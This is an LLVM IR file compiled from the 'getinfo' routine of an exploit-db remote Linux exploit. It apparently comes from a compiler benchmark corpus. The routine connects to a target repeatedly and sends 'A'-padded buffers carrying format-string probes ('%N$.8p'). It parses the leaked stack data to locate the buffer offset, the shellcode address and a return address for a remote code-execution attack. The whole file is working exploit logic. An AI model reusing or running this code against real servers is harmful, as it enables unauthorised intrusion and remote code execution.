; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1123.c_getinfo.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1123.c_getinfo.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i8, %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@BUFFERSIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [17 x i8] c" gethostbyname()\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.2 = private unnamed_addr constant [29 x i8] c" [*] getting target info...\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@TIMEOUT = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [13 x i8] c"BBBBBBBBBBBB\00", align 1
@.str.4 = private unnamed_addr constant [11 x i8] c".%%%u$.8p\0A\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c".\00", align 1
@pos = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [9 x i8] c"42424242\00", align 1
@shaddr = common dso_local global i64 0, align 8
@.str.7 = private unnamed_addr constant [5 x i8] c"0x08\00", align 1
@.str.8 = private unnamed_addr constant [29 x i8] c" [*] buffer address\09\09: %.8p\0A\00", align 1
@.str.9 = private unnamed_addr constant [32 x i8] c" [*] shellcode address\09\09: %.8p\0A\00", align 1
@bretaddr = common dso_local global i64 0, align 8
@.str.10 = private unnamed_addr constant [5 x i8] c"0xbf\00", align 1
@.str.11 = private unnamed_addr constant [34 x i8] c" [*] basic return address\09: %.8p\0A\00", align 1
@.str.12 = private unnamed_addr constant [39 x i8] c" [*] shellcode address\09\09: not found!\0A\0A\00", align 1
@.str.13 = private unnamed_addr constant [41 x i8] c" [*] basic return address\09: not found!\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @getinfo(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i8*, align 8
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %14 = load i32, i32* @BUFFERSIZE, align 4
  %15 = zext i32 %14 to i64
  %16 = call i8* @llvm.stacksave()
  store i8* %16, i8** %5, align 8
  %17 = alloca i8, i64 %15, align 16
  store i64 %15, i64* %6, align 8
  %18 = load i32, i32* @BUFFERSIZE, align 4
  %19 = zext i32 %18 to i64
  %20 = alloca i8, i64 %19, align 16
  store i64 %19, i64* %7, align 8
  %21 = load i32, i32* @BUFFERSIZE, align 4
  %22 = zext i32 %21 to i64
  %23 = alloca i8, i64 %22, align 16
  store i64 %22, i64* %8, align 8
  store i8* null, i8** %9, align 8
  %24 = load i8*, i8** %3, align 8
  %25 = call %struct.hostent* @gethostbyname(i8* %24)
  store %struct.hostent* %25, %struct.hostent** %10, align 8
  %26 = icmp eq %struct.hostent* %25, null
  br i1 %26, label %27, label %31

27:                                               ; preds = %2
  %28 = call i32 @herror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0))
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  %30 = call i32 @exit(i32 1) #5
  unreachable

31:                                               ; preds = %2
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.2, i64 0, i64 0))
  %33 = load i32, i32* @stdout, align 4
  %34 = call i32 @fflush(i32 %33)
  store i32 1, i32* %13, align 4
  br label %35

35:                                               ; preds = %140, %31
  %36 = load i32, i32* %13, align 4
  %37 = icmp slt i32 %36, 50
  br i1 %37, label %38, label %143

38:                                               ; preds = %35
  %39 = trunc i64 %15 to i32
  %40 = call i32 @bzero(i8* %17, i32 %39)
  %41 = load i32, i32* @AF_INET, align 4
  %42 = load i32, i32* @SOCK_STREAM, align 4
  %43 = call i32 @socket(i32 %41, i32 %42, i32 0)
  store i32 %43, i32* %12, align 4
  %44 = load i32, i32* @AF_INET, align 4
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 3
  store i32 %44, i32* %45, align 4
  %46 = load i32, i32* %4, align 4
  %47 = call i32 @htons(i32 %46)
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i32 %47, i32* %48, align 4
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  %50 = load %struct.hostent*, %struct.hostent** %10, align 8
  %51 = getelementptr inbounds %struct.hostent, %struct.hostent* %50, i32 0, i32 0
  %52 = load i64, i64* %51, align 8
  %53 = inttoptr i64 %52 to %struct.in_addr*
  %54 = bitcast %struct.in_addr* %49 to i8*
  %55 = bitcast %struct.in_addr* %53 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %54, i8* align 4 %55, i64 4, i1 false)
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  %57 = call i32 @bzero(i8* %56, i32 8)
  %58 = load i32, i32* %12, align 4
  %59 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %60 = load i32, i32* @TIMEOUT, align 4
  %61 = call i32 @connect_timeout(i32 %58, %struct.sockaddr* %59, i32 4, i32 %60)
  %62 = load i32, i32* %12, align 4
  %63 = trunc i64 %15 to i32
  %64 = call i32 @read(i32 %62, i8* %17, i32 %63)
  %65 = trunc i64 %19 to i32
  %66 = call i32 @memset(i8* %20, i32 0, i32 %65)
  %67 = call i32 @memset(i8* %20, i32 65, i32 496)
  %68 = call i32 @strcat(i8* %20, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0))
  %69 = load i32, i32* %13, align 4
  %70 = call i32 @sprintf(i8* %23, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i64 0, i64 0), i32 %69)
  %71 = call i32 @strcat(i8* %20, i8* %23)
  %72 = load i32, i32* %12, align 4
  %73 = call i32 @strlen(i8* %20)
  %74 = call i32 @write(i32 %72, i8* %20, i32 %73)
  %75 = load i32, i32* %12, align 4
  %76 = trunc i64 %15 to i32
  %77 = call i32 @read(i32 %75, i8* %17, i32 %76)
  %78 = load i32, i32* %12, align 4
  %79 = call i32 @close(i32 %78)
  %80 = call i8* @strstr(i8* %17, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  store i8* %80, i8** %9, align 8
  %81 = load i32, i32* @pos, align 4
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %83, label %90

83:                                               ; preds = %38
  %84 = load i8*, i8** %9, align 8
  %85 = call i8* @strstr(i8* %84, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  %86 = icmp ne i8* %85, null
  br i1 %86, label %87, label %89

87:                                               ; preds = %83
  %88 = load i32, i32* %13, align 4
  store i32 %88, i32* @pos, align 4
  br label %89

89:                                               ; preds = %87, %83
  br label %90

90:                                               ; preds = %89, %38
  %91 = load i64, i64* @shaddr, align 8
  %92 = icmp eq i64 %91, 0
  br i1 %92, label %93, label %115

93:                                               ; preds = %90
  %94 = load i8*, i8** %9, align 8
  %95 = call i8* @strstr(i8* %94, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0))
  %96 = icmp ne i8* %95, null
  br i1 %96, label %97, label %114

97:                                               ; preds = %93
  %98 = load i8*, i8** %3, align 8
  %99 = load i32, i32* %4, align 4
  %100 = load i32, i32* %13, align 4
  %101 = call i64 @chkshaddr(i8* %98, i32 %99, i32 %100)
  %102 = icmp ne i64 %101, 0
  br i1 %102, label %103, label %113

103:                                              ; preds = %97
  %104 = load i8*, i8** %9, align 8
  %105 = getelementptr inbounds i8, i8* %104, i32 1
  store i8* %105, i8** %9, align 8
  %106 = call i64 @strtoul(i8* %105, i32 0, i32 0)
  store i64 %106, i64* @shaddr, align 8
  %107 = load i64, i64* @shaddr, align 8
  %108 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.8, i64 0, i64 0), i64 %107)
  %109 = load i64, i64* @shaddr, align 8
  %110 = add nsw i64 %109, 350
  store i64 %110, i64* @shaddr, align 8
  %111 = load i64, i64* @shaddr, align 8
  %112 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.9, i64 0, i64 0), i64 %111)
  br label %113

113:                                              ; preds = %103, %97
  br label %114

114:                                              ; preds = %113, %93
  br label %115

115:                                              ; preds = %114, %90
  %116 = load i64, i64* @bretaddr, align 8
  %117 = icmp eq i64 %116, 0
  br i1 %117, label %118, label %129

118:                                              ; preds = %115
  %119 = load i8*, i8** %9, align 8
  %120 = call i8* @strstr(i8* %119, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0))
  %121 = icmp ne i8* %120, null
  br i1 %121, label %122, label %128

122:                                              ; preds = %118
  %123 = load i8*, i8** %9, align 8
  %124 = getelementptr inbounds i8, i8* %123, i32 1
  store i8* %124, i8** %9, align 8
  %125 = call i64 @strtoul(i8* %124, i32 0, i32 0)
  store i64 %125, i64* @bretaddr, align 8
  %126 = load i64, i64* @bretaddr, align 8
  %127 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.11, i64 0, i64 0), i64 %126)
  br label %128

128:                                              ; preds = %122, %118
  br label %129

129:                                              ; preds = %128, %115
  %130 = load i32, i32* @pos, align 4
  %131 = icmp ne i32 %130, 0
  br i1 %131, label %132, label %139

132:                                              ; preds = %129
  %133 = load i64, i64* @shaddr, align 8
  %134 = icmp ne i64 %133, 0
  br i1 %134, label %135, label %139

135:                                              ; preds = %132
  %136 = load i64, i64* @bretaddr, align 8
  %137 = icmp ne i64 %136, 0
  br i1 %137, label %138, label %139

138:                                              ; preds = %135
  br label %143

139:                                              ; preds = %135, %132, %129
  br label %140

140:                                              ; preds = %139
  %141 = load i32, i32* %13, align 4
  %142 = add nsw i32 %141, 1
  store i32 %142, i32* %13, align 4
  br label %35

143:                                              ; preds = %138, %35
  %144 = load i64, i64* @shaddr, align 8
  %145 = icmp eq i64 %144, 0
  br i1 %145, label %146, label %149

146:                                              ; preds = %143
  %147 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.12, i64 0, i64 0))
  %148 = call i32 @exit(i32 1) #5
  unreachable

149:                                              ; preds = %143
  %150 = load i64, i64* @bretaddr, align 8
  %151 = icmp eq i64 %150, 0
  br i1 %151, label %152, label %155

152:                                              ; preds = %149
  %153 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.13, i64 0, i64 0))
  %154 = call i32 @exit(i32 1) #5
  unreachable

155:                                              ; preds = %149
  %156 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  %157 = load i8*, i8** %5, align 8
  call void @llvm.stackrestore(i8* %157)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @herror(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @fflush(i32) #2

declare dso_local i32 @bzero(i8*, i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @htons(i32) #2

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #4

declare dso_local i32 @connect_timeout(i32, %struct.sockaddr*, i32, i32) #2

declare dso_local i32 @read(i32, i8*, i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32 @sprintf(i8*, i8*, i32) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @close(i32) #2

declare dso_local i8* @strstr(i8*, i8*) #2

declare dso_local i64 @chkshaddr(i8*, i32, i32) #2

declare dso_local i64 @strtoul(i8*, i32, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind willreturn }
attributes #5 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
